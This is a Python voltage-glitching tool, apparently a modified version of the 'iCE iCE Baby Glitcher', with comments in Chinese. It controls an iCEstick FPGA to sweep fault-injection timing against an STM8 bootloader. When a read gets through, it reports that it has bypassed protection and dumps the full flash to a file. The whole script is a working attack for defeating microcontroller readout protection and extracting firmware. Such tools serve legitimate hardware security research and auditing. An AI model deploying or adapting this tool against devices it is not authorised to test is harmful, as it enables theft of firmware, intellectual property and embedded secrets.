#!/usr/bin/env python
# -*- coding: utf-8 -*-

__version__ = '0.5'
__author__  = 'Matthias Deeg (mod for STM8)'

import argparse
from datetime import datetime
from pylibftdi import Device, INTERFACE_B
from struct import pack
from sty import fg, ef
from time import sleep

# ----------------------------------------------------------------------
# 常量与文件名
# ----------------------------------------------------------------------
DUMP_FILE      = "memory.bin"     # 直接写原始二进制
RESULTS_FILE   = "results.txt"

# FPGA 命令（保持与原工程一致）
CMD_PASSTHROUGH   = b"\x00"
CMD_RESET         = b"\x01"
CMD_SET_DURATION  = b"\x02"
CMD_SET_OFFSET    = b"\x03"
CMD_START_GLITCH  = b"\x04"

# STM8 Bootloader 协议常量
STM8_BYTE_SYNCH = 0x7F
STM8_BYTE_ACK   = 0x79
STM8_CMD_GET    = 0x00
STM8_CMD_READ   = 0x11

# 原脚本里用来限制循环等待；这里用于原始字节读超时轮次
RAW_TIMEOUT_LOOPS = 4000


class Glitcher():
    """iCEstick + STM8 bootloader（二进制协议）"""

    def __init__(self,
                 start_offset=0, end_offset=5000, offset_step=1,
                 duration_step=1, start_duration=1, end_duration=30,
                 retries=2,
                 flash_size=32*1024, block_size=32):
        # 通过 FTDI 同 FPGA 通讯
        self.dev = Device(mode='b', interface_select=INTERFACE_B)
        self.dev.baudrate = 115200

        # 扫描参数（保留原有）
        self.offset_step     = offset_step
        self.duration_step   = duration_step
        self.start_offset    = start_offset
        self.end_offset      = end_offset
        self.start_duration  = start_duration
        self.end_duration    = end_duration
        self.retries         = retries

        # 读 Flash 参数（STM8）
        self.flash_size      = flash_size
        self.block_size      = block_size

    # ------------------------------------------------------------------
    # 低层：通过 PASSTHROUGH 发送/接收原始字节（非 ASCII）
    # ------------------------------------------------------------------
    def _pt_write(self, payload: bytes):
        """经 FPGA passthrough 发送原始字节."""
        self.dev.write(CMD_PASSTHROUGH + pack("B", len(payload)) + payload)

    def _rx_byte(self):
        """读一个字节（带循环超时，避免永久阻塞）"""
        loops = 0
        while loops < RAW_TIMEOUT_LOOPS:
            b = self.dev.read(1)
            if b:
                return b[0]
            loops += 1
        return None

    def _rx_exact(self, n):
        """精确读取 n 个字节，返回 bytes；失败返回 None"""
        out = bytearray()
        for _ in range(n):
            b = self._rx_byte()
            if b is None:
                return None
            out.append(b)
        return bytes(out)

    def _expect_ack(self):
        """期望收到 ACK(0x79)"""
        return self._rx_byte() == STM8_BYTE_ACK

    @staticmethod
    def _addr_frame(addr: int):
        """地址 + XOR 校验（大端）"""
        a3 = (addr >> 24) & 0xFF
        a2 = (addr >> 16) & 0xFF
        a1 = (addr >> 8)  & 0xFF
        a0 =  addr        & 0xFF
        chk = a3 ^ a2 ^ a1 ^ a0
        return bytes([a3, a2, a1, a0, chk])

    # ------------------------------------------------------------------
    # STM8 协议：握手 + 读取
    # ------------------------------------------------------------------
    def synchronize(self):
        """
        STM8 bootloader 握手：
        主机发 0x7F，目标返回 0x79 (ACK)。
        """
        self._pt_write(bytes([STM8_BYTE_SYNCH]))
        return self._expect_ack()

    def stm8_read_block(self, addr: int, n: int):
        """
        读取一块数据（1..256 字节）。
        流程：READ(0x11)+~ -> ACK -> Addr4+XOR -> ACK -> (n-1)+~ -> ACK -> Data(n)
        """
        if not (1 <= n <= 256):
            raise ValueError("block size must be 1..256 bytes")

        # 1) READ 命令与反码
        self._pt_write(bytes([STM8_CMD_READ, STM8_CMD_READ ^ 0xFF]))
        if not self._expect_ack():
            return None

        # 2) 地址帧
        self._pt_write(self._addr_frame(addr))
        if not self._expect_ack():
            return None

        # 3) 长度（n-1）与反码
        ln = (n - 1) & 0xFF
        self._pt_write(bytes([ln, ln ^ 0xFF]))
        if not self._expect_ack():
            return None

        # 4) 读取 n 字节数据
        data = self._rx_exact(n)
        return data

    # ------------------------------------------------------------------
    # FPGA 控制：复位/触发/参数设置（保留原有）
    # ------------------------------------------------------------------
    def reset_target(self):
        """复位目标设备（由 FPGA 控制）"""
        self.dev.write(CMD_RESET)

    def set_glitch_duration(self, duration):
        """设置故障宽度（FPGA 时钟周期）"""
        self.dev.write(CMD_SET_DURATION + pack("<L", duration))

    def set_glitch_offset(self, offset):
        """设置故障偏移（FPGA 时钟周期）"""
        self.dev.write(CMD_SET_OFFSET + pack("<L", offset))

    def start_glitch(self):
        """开始计数，等待触发注入"""
        self.dev.write(CMD_START_GLITCH)

    # ------------------------------------------------------------------
    # 读整片 Flash
    # ------------------------------------------------------------------
    def dump_memory(self):
        """
        连续读取整片 Flash，写到 memory.bin。
        默认 flash_size=32KB、block_size=32B；可在命令行改。
        """
        total = self.flash_size
        step  = self.block_size

        buf = bytearray()
        for addr in range(0, total, step):
            data = self.stm8_read_block(addr, step)
            if data is None or len(data) != step:
                # 读失败用 0xFF 填充，保长度一致，避免偏移错位
                data = b"\xFF" * step
            buf.extend(data)

        with open(DUMP_FILE, "wb") as f:
            f.write(buf)

        print(fg.li_white + f"[*] Dumped {len(buf)} bytes to '{DUMP_FILE}'" + fg.rs)

    # ------------------------------------------------------------------
    # 主流程：扫描故障参数 -> 复位 -> 握手 -> 试读 -> 成功则整片读取
    # ------------------------------------------------------------------
    def run(self):
        start_time = datetime.now()

        for offset in range(self.start_offset, self.end_offset, self.offset_step):
            for duration in range(self.start_duration, self.end_duration, self.duration_step):
                for _ in range(self.retries):
                    print(fg.li_white + f"[*] Set glitch configuration ({offset},{duration})" + fg.rs)

                    self.set_glitch_offset(offset)
                    self.set_glitch_duration(duration)
                    self.start_glitch()

                    # 复位进入 bootloader
                    self.reset_target()

                    # 可按需等待一小会儿让 BootROM 起稳
                    sleep(0.01)

                    # STM8 握手
                    if not self.synchronize():
                        print(fg.li_red + "[-] Sync failed" + fg.rs)
                        continue

                    # 尝试读 16 字节作为“成功标志”
                    probe = self.stm8_read_block(0x00000000, 16)
                    if probe and len(probe) == 16:
                        end_time = datetime.now()
                        print(ef.bold + fg.green +
                              "[*] Glitching success!\n"
                              "    Bypassed protection with parameters:\n"
                              f"        offset   = {offset}\n"
                              f"        duration = {duration}\n"
                              f"    Time to find this glitch: {end_time - start_time}" + fg.rs)

                        # 记录结果
                        with open(RESULTS_FILE, "a") as f:
                            f.write(f"{offset},{duration},OK\n")

                        # 整片读取
                        print(fg.li_white + "[*] Dumping flash ..." + fg.rs)
                        self.dump_memory()
                        return True
                    else:
                        print(fg.li_red + "[?] Probe read failed" + fg.rs)

        return False


def banner():
    print(fg.li_white + "\n" +
""" ██▓ ▄████▄  ▓█████     ██▓ ▄████▄  ▓█████     ▄▄▄▄    ▄▄▄       ▄▄▄▄ ▓██   ██▓     ▄████  ██▓     ██▓▄▄▄█████▓ ▄████▄   ██░ ██ ▓█████  ██▀███  \n"""
"""▓██▒▒██▀ ▀█  ▓█   ▀    ▓██▒▒██▀ ▀█  ▓█   ▀    ▓█████▄ ▒████▄    ▓█████▄▒██  ██▒    ██▒ ▀█▒▓██▒    ▓██▒▓  ██▒ ▓▒▒██▀ ▀█  ▓██░ ██▒▓█   ▀ ▓██ ▒ ██▒\n"""
"""▒██▒▒▓█    ▄ ▒███      ▒██▒▒▓█    ▄ ▒███      ▒██▒ ▄██▒██  ▀█▄  ▒██▒ ▄██▒██ ██░   ▒██░▄▄▄░▒██░    ▒██▒▒ ▓██░ ▒░▒▓█    ▄ ▒██▀▀██░▒███   ▓██ ░▄█ ▒\n"""
"""░██░▒▓▓▄ ▄██▒▒▓█  ▄    ░██░▒▓▓▄ ▄██▒▒▓█  ▄    ▒██░█▀  ░██▄▄▄▄██ ▒██░█▀  ░ ▐██▓░   ░▓█  ██▓▒██░    ░██░░ ▓██▓ ░ ▒▓▓▄ ▄██▒░▓█ ░██ ▒▓█  ▄ ▒██▀▀█▄  \n"""
"""░██░▒ ▓███▀ ░░▒████▒   ░██░▒ ▓███▀ ░░▒████▒   ░▓█  ▀█▓ ▓█   ▓██▒░▓█  ▀█▓░ ██▒▓░   ░▒▓███▀▒░██████▒░██░  ▒██▒ ░ ▒ ▓███▀ ░░▓█▒░██▓░▒████▒░██▓ ▒██▒\n"""
"""░▓  ░ ░▒ ▒  ░░░ ▒░ ░   ░▓  ░ ░▒ ▒  ░░░ ▒░ ░   ░▒▓███▀▒ ▒▒   ▓▒█░░▒▓███▀▒ ██▒▒▒     ░▒   ▒ ░ ▒░▓  ░░▓    ▒ ░░   ░ ░▒ ▒  ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒▓ ░▒▓░\n"""
""" ▒ ░  ░  ▒    ░ ░  ░    ▒ ░  ░  ▒    ░ ░  ░   ▒░▒   ░   ▒   ▒▒ ░▒░▒   ░▓██ ░▒░      ░   ░ ░ ░ ▒  ░ ▒ ░    ░      ░  ▒    ▒ ░▒░ ░ ░ ░  ░  ░▒ ░ ▒░\n"""
""" ▒ ░░           ░       ▒ ░░           ░       ░    ░   ░   ▒    ░    ░▒ ▒ ░░     ░ ░   ░   ░ ░    ▒ ░  ░      ░         ░  ░░ ░   ░     ░░   ░ \n"""
""" ░  ░ ░         ░  ░    ░  ░ ░         ░  ░    ░            ░  ░ ░     ░ ░              ░     ░  ░ ░           ░ ░       ░  ░  ░   ░  ░   ░     \n"""
"""    ░                      ░                        ░                 ░░ ░                                     ░                                \n"""
"""iCE iCE Baby Glitcher (STM8 mode)\n""" + fg.rs)


if __name__ == '__main__':
    banner()

    parser = argparse.ArgumentParser("./glitcher_stm8.py")
    parser.add_argument('--start_offset',   type=int, default=100)
    parser.add_argument('--end_offset',     type=int, default=10000)
    parser.add_argument('--start_duration', type=int, default=1)
    parser.add_argument('--end_duration',   type=int, default=30)
    parser.add_argument('--offset_step',    type=int, default=1)
    parser.add_argument('--duration_step',  type=int, default=1)
    parser.add_argument('--retries',        type=int, default=2)

    # STM8 读数相关
    parser.add_argument('--flash_size',     type=lambda x:int(x,0), default=0x8000, help="Flash size in bytes (e.g. 0x8000 for 32KB)")
    parser.add_argument('--block_size',     type=int, default=32,    help="Read block size (1..256)")

    args = parser.parse_args()

    glitcher = Glitcher(
        start_offset=args.start_offset,
        end_offset=args.end_offset,
        start_duration=args.start_duration,
        end_duration=args.end_duration,
        offset_step=args.offset_step,
        duration_step=args.duration_step,
        retries=args.retries,
        flash_size=args.flash_size,
        block_size=args.block_size
    )

    glitcher.run()
